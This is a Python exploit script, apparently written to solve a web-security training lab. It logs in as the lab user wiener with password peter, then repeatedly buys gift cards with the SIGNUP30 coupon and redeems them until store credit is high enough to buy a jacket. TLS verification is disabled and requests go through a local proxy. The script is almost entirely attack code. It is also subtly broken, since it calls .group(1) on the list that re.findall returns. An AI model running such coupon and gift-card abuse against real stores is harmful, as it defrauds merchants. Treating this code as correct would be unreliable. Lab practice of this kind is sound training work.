import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url, default="/cart/order-confirmation?order-confirmed=true"):
    headers = {'Referer':default}
    res = session.get(url, proxies=proxies, headers=headers, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})

    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None


def business_logic_exploit(session, url) :
    
    # Get the CSRF token from login
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, login_url)
    
    # Login as the wiener user
    data = {'csrf':csrf_token,'username':'wiener','password':'peter'}
    res = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if "Log out" in res.text :
        
        print("The wiener user log in successfully!")
        
        price = 0
        cart_url = url + '/cart'
        coupon_url = url + '/cart/coupon'
        checkout_url = url + '/cart/checkout'
        
        # headers = {"Referer":url}
        
        while price < 935.9 :
            
            # Adding the gift item 
            data = {'productId':'2','redir':'PRODUCT','quantity':'1'}
            r = session.post(cart_url, data=data, verify=False, proxies=proxies)
            
            csrf_token = get_csrf_token(session, cart_url)
            data = {'csrf':csrf_token,'coupon':'SIGNUP30'}
            r = session.post(coupon_url, data=data, verify=False, proxies=proxies)
            
            data = {'csrf':csrf_token}
            res = session.post(checkout_url, data=data, verify=False, proxies=proxies)
            
            if "is-table-numbers" in res.text :
                # Use regex to find the content of the top <td> element in the specific table
                pattern = r'<table\s+class="is-table-numbers">.*?<td>(.*?)<\/td>'

                matches = re.findall(pattern, res.text)
                
                if matches:
                    top_td_content = matches.group(1)
                    my_account_url = url + "/my-account?id=wiener"
                    csrf_token = get_csrf_token(session, my_account_url)
                    
                    gift_url = url + "/gift-card"
                    data = {'csrf':csrf_token,'gift-card':top_td_content}
                    
                    res = session.post(gift_url, data=data, verify=False, proxies=proxies)
                    # Use regex to find the total store credit value
                    pattern = r'Store credit: \$(.*) '
                    matches = re.search(pattern, res.text)
                    print(matches)
                    if matches:
                        price = float(matches.group(1))
                        print("Store Credit Value:", price)
                    else:
                        print("Store credit value not found.")
                else:
                    print("Top TD content not found.")
         
        # Adding the ligth jacket       
        data = {'productId':'1','redir':'PRODUCT','quantity':'1'}
        r = session.post(cart_url, data=data, verify=False, proxies=proxies)
         
        # Applying the gift cart                
        csrf_token = get_csrf_token(session, cart_url)
        data = {'csrf':csrf_token,'coupon':'SIGNUP30'}
        r = session.post(coupon_url, data=data, verify=False, proxies=proxies)
        
        # Buying the ligth jacket 
        data = {'csrf':csrf_token}
        res = session.post(checkout_url, data=data, verify=False, proxies=proxies)
        
        if "Your order is on its way!" in res.text :
            print("You have successfully buy the item!")
        else :
            print("Failed to buy the item!")
    else :
        print("You failed to solve the lab!")
    
if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    business_logic_exploit(session, url)